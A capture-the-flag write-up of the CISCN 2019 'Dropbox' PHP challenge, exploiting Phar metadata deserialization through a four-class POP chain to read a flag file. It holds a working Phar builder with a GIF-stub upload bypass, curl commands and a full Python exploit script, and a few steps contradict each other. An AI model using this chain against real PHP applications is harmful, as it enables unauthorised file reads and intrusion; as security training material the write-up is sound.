# CISCN 2019 Northern Region — Dropbox (Phar Deserialization)

> **Flag**: `flag{...}` (organiser-rotated)
>
> A four-class PHP POP chain delivered through Phar's metadata deserialization. The bug shape is canonical — `file_exists($_GET['file'])` triggered against a `phar://`-wrapped path — but the chain itself spans `User → FileList → File → File::close → file_get_contents` and uses `__call` as the bridge between classes that don't obviously interact. The interesting parts to record are: (1) which file operation actually triggers Phar deserialization in this app (it's not the obvious `download.php`), (2) why a `GIF89a` stub passes the upload filter, and (3) how the destruct ordering between `User` and `FileList` accidentally gives us output.

## 0. App overview

| Field | Value |
|---|---|
| Stack | PHP 5.6.40 + nginx |
| Upload | Whitelist on Content-Type → `image/gif`, `image/jpeg`, `image/png` |
| Storage | `uploads/sha1(username + "sftUahRiTz")/` |
| Target | `/flag.txt` outside webroot |
| Filter | `download.php` filters the keyword `flag` |
| Bypass surface | `delete.php` calls `file_exists()` on user-controllable path with no `open_basedir` enforcement |

## 1. Source acquisition

`download.php` accepts an absolute path. Reading it back gives us the application source:

```
GET /download.php?file=/var/www/html/index.php   → index.php source
GET /download.php?file=/var/www/html/class.php   → all class definitions
GET /download.php?file=/var/www/html/delete.php
GET /download.php?file=/var/www/html/upload.php
```

We can't read `/flag.txt` directly through `download.php` because the keyword `flag` is filtered in that endpoint. We can however read it through Phar deserialization (which goes through `file_get_contents`, a different code path with no keyword filter).

## 2. The classes (from `class.php`)

```php
class User {
    public $db;

    public function __destruct() {
        $this->db->close();             // ← entry point on object destruction
    }
}

class FileList {
    private $files;
    private $results;
    private $funcs;

    public function __call($name, $args) {
        // routes unknown calls to all member File objects
        array_push($this->funcs, $name);
        foreach ($this->files as $file) {
            $this->results[$file->name()][$name] = $file->$name();
        }
    }

    public function __destruct() {
        // prints the results table — this is our output channel
        $table = "<table>...<tr><td>{name}</td><td>{close result}</td></tr>...</table>";
        echo $table;
    }
}

class File {
    public $filename;
    public function name()  { return basename($this->filename); }
    public function close() { return file_get_contents($this->filename); }
    // ...other file ops
}
```

The POP chain composes:

1. **`User::__destruct()`** — fires when the unserialized object is garbage-collected. Calls `$this->db->close()`.
2. If `$this->db` is a `FileList` (which has no `close` method), `__call('close', [])` triggers.
3. **`FileList::__call('close')`** — iterates `$this->files`, calls `$file->close()` on each, stores result in `$this->results[name]['close']`.
4. **`File::close()`** — returns `file_get_contents($this->filename)`. We set `$this->filename = "/flag.txt"`.
5. **`FileList::__destruct()`** fires after `User::__destruct()` returns. The `__call` step has already populated `$this->results`. The destructor echoes a table containing those results — **including the file contents we just read**.

The destruct-order detail (User first, then FileList) is the critical bit. It's not arbitrary — PHP destructs objects in reverse order of their internal handle assignment. The Phar payload must place User after FileList so that User gets destructed first.

## 3. Building the Phar

```php
<?php
class User {
    public $db;
}
class FileList {
    private $files;
    private $results;
    private $funcs;
    
    public function __construct() {
        $f = new File();
        $f->filename = "/flag.txt";
        $this->files   = [$f];
        $this->results = [];
        $this->funcs   = [];
    }
}
class File {
    public $filename;
}

@unlink("exploit.phar");
$phar = new Phar("exploit.phar");
$phar->startBuffering();
$phar->setStub("GIF89a<?php __HALT_COMPILER();?>");   // GIF magic bytes for upload filter
$phar->addFromString("test.txt", "test");

$flist = new FileList();
$user  = new User();
$user->db = $flist;

$phar->setMetadata($user);                             // ← unserialize target
$phar->stopBuffering();

rename("exploit.phar", "exploit.gif");
```

Run this locally with `php -d phar.readonly=0 build.php`. Output: `exploit.gif`.

The `GIF89a` stub is the trick. Phar's `__HALT_COMPILER()` machinery scans for that token regardless of what precedes it — so prepending the GIF magic bytes lets the file pass:

- `Content-Type: image/gif` (browser / server sniff)
- `getimagesize()` checks if any are added later
- Manual extension checks for `.gif`

While still being a valid Phar archive that PHP's `phar://` wrapper can parse.

## 4. Triggering — why `delete.php`, not `download.php`

The Phar trigger fires when any **file-system function** receives a path that begins with `phar://`. Candidates:

- `file_exists()`, `is_file()`, `is_dir()`, `stat()`, `fopen()`, `file_get_contents()`, `unlink()`, etc.

`download.php` calls `file_get_contents()` — would trigger Phar deserialization — but has `open_basedir` set to the webroot. `phar://` paths within the webroot work, but cross-directory file reads inside the unserialized callback also need to escape `open_basedir`, which is not always reliable.

`delete.php`'s implementation:

```php
$path = "uploads/" . sha1($_SESSION['username'] . "sftUahRiTz") . "/" . $_POST['filename'];
if (file_exists($path)) {
    unlink($path);
    echo "deleted";
}
```

No `open_basedir` enforcement. `file_exists()` triggers Phar deserialization when given `phar://uploads/<sha1-dir>/exploit.gif`. From inside the deserialized POP chain we then reach `file_get_contents('/flag.txt')` freely.

## 5. Putting it together

```bash
# Step 1: register a user, log in, capture session cookie
# Step 2: derive upload directory
$ python -c "import hashlib; print(hashlib.sha1(('alice'+'sftUahRiTz').encode()).hexdigest())"
93d4a3b2f9...

# Step 3: build the phar locally
$ php -d phar.readonly=0 build.php
# → exploit.gif

# Step 4: upload it
$ curl -b "PHPSESSID=..." \
       -F "file=@exploit.gif" \
       http://target/upload.php

# Step 5: trigger via delete.php with phar:// wrapper
$ curl -b "PHPSESSID=..." \
       -d "filename=../../uploads/93d4a3b2f9.../exploit.gif" \
       --data-urlencode "filename=phar://uploads/93d4a3b2f9.../exploit.gif" \
       http://target/delete.php
```

(The relative-path traversal needs care — depending on `delete.php`'s working directory, you may need `phar://uploads/...` directly without traversal.)

The response from `delete.php` will contain the `FileList::__destruct()` echo'd table — and inside it, the flag.

## 6. Full exploit script

```python
#!/usr/bin/env python3
import sys
import hashlib
import requests

TARGET = sys.argv[1].rstrip('/')
USER   = "alice"
PASS   = "alice"

s = requests.Session()

# 1) Register + login
s.post(f"{TARGET}/register.php", data={"username": USER, "password": PASS})
s.post(f"{TARGET}/login.php",    data={"username": USER, "password": PASS})

# 2) Derive upload dir
salt = "sftUahRiTz"
dirname = hashlib.sha1((USER + salt).encode()).hexdigest()

# 3) Upload pre-built exploit.gif (build with build.php beforehand)
with open("exploit.gif", "rb") as f:
    s.post(f"{TARGET}/upload.php", files={"file": ("exploit.gif", f, "image/gif")})

# 4) Trigger
phar_path = f"phar://uploads/{dirname}/exploit.gif"
r = s.post(f"{TARGET}/delete.php", data={"filename": phar_path})
print(r.text)   # contains the flag in the rendered table
```

## 7. Traps and lessons learned

| Trap | Why it cost me time | Resolution |
|---|---|---|
| Tried `download.php` as trigger | The keyword filter on `flag` blocked direct reads, but I assumed the phar wrapper would bypass it | `download.php`'s filter checks the raw path string. `phar://uploads/.../exploit.gif` doesn't contain `flag`, so it passes — but the *deserialized* `file_get_contents` inside the POP chain still hit open_basedir restrictions on download.php's context |
| Built the Phar without GIF stub | Standard `<?php __HALT_COMPILER();?>` stub; upload filter blocked it | Prefix `GIF89a` to the stub — Phar tolerates anything before `__HALT_COMPILER()` |
| Wrong destruct order | Initially placed `$user` *inside* `FileList::$files`, so FileList destructed first and printed empty results | The User object needs to be the top-level metadata, with FileList nested inside `$user->db`. PHP destructs handles in reverse allocation order; getting this right takes attention to the build script |
| `phar.readonly=Off` not set locally | `php build.php` errored "creating archive disabled by readonly INI option" | Always run build with `php -d phar.readonly=0 build.php`. On many distros readonly is `On` by default |
| Forgot to log in before upload | `upload.php` redirected to login; phar got 302'd | Session cookie discipline — log in, then upload, then trigger, all in the same session |
| Upload directory computed wrong | Used `sha1(USER)` without the salt | Always read the source. The salt `sftUahRiTz` was in `upload.php` |

## 8. Methodology takeaways

1. **Phar deserialization triggers on *any* file-system function with a `phar://` path.** Memorise the list: `file_exists`, `is_file`, `is_dir`, `stat`, `lstat`, `fileatime`, `filemtime`, `fopen`, `file`, `file_get_contents`, `readfile`, `unlink`, `filesize`. Every one of these is a potential entry point.
2. **POP chain construction is a graph-walking problem.** Start from the magic methods you have (`__destruct`, `__wakeup`, `__call`, `__toString`, `__get`, `__set`). Build the directed graph of "what methods do these magic methods call". Search for a path to your desired sink (file read, command exec, etc.). `__call` is the most flexible bridge because it accepts arbitrary method names.
3. **Destruct ordering matters in multi-class chains.** PHP destructs objects in reverse handle-allocation order. When chaining `Class A → Class B`, make sure the *outermost* container (the one your `Phar::setMetadata` points to) is the one whose `__destruct` should fire first.
4. **Image stubs are universal upload filter bypass.** `GIF89a` for GIF, `\xff\xd8\xff\xe0` for JPEG, `\x89PNG\r\n\x1a\n` for PNG. Phar archives, malicious SVGs, polyglot files — all of them benefit from a magic-byte prefix.
5. **Filter location matters.** A keyword filter on path strings is bypassed by URL-encoding, alternate path representations (`phar://`, `compress.zlib://`), or by chaining through a function that doesn't see the user-controlled string directly (POP chain).

## 9. Related techniques

- [PHP Phar Deserialization](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Deserialization/PHP.md#phar-deserialization) — PayloadsAllTheThings reference
- [Sam Thomas's BlackHat 2018 talk](https://www.blackhat.com/docs/us-18/materials/us-18-Thomas-Its-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It.pdf) — original public disclosure of Phar deserialization
- [phpggc](https://github.com/ambionics/phpggc) — Ambionics's automated POP chain generator for common PHP libraries
